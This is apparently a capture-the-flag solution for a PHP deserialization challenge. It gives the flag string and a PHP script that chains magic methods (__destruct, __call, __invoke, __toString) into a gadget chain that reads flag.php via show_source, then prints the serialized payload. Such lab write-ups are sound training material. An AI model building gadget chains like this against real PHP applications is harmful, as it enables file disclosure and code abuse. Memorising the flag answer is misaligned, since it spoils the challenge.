# Deserialization_05
Flag: `NISRA{N0W_Y0U_F1NALLY_KN0W_TH3_B4S1C_0F_D3S3R14L1Z4T10N}`

Payload:
```
<?php
    class Challenge{
        public $mod;

        public function __construct(){
            $this->mod = new Function1();
        }

        public function __destruct(){
            $this->mod->test1();
        }
    }

    class Function1{
        public $mod;

        public function __construct(){
            $this->mod = new Function2();
        }

        public function test1(){
            $this->mod->test2();
        }
    }

    class Function2{
        public $mod;

        public function __construct(){
            $this->mod = new Function3();
        }

        public function __call($test2, $arr){
            $tmp = $this->mod;
            $tmp();
        }
    }

    class Function3{
        public $mod;
        public $mod2;

        public function __construct(){
            $this->mod = new CustomString();
        }

        public function __invoke(){
            $this->mod2 = "String: ".$this->mod;
        }
    }

    class CustomString{
        public $str;

        public function __construct(){
            $this->str = new Flag();
        }

        public function __toString(){
            $this->str->get_flag();
            return "";
        }
    }

    class Flag{
        public function get_flag(){
            show_source('flag.php');
        }
    }

    echo serialize(new Challenge());
?>
```